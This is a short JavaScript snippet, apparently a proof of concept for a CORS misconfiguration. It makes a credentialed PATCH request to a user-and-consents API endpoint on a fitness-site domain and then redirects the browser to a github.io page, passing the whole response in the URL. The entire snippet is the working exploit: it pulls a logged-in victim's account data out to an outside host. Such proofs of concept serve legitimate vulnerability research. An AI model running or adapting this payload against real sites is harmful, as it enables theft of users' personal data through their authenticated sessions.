var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('PATCH','https://www.myfitnespal.com/api/idm/user-with-consents',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='https://anisub004.github.io/cors/?key='+this.responseText; 
};
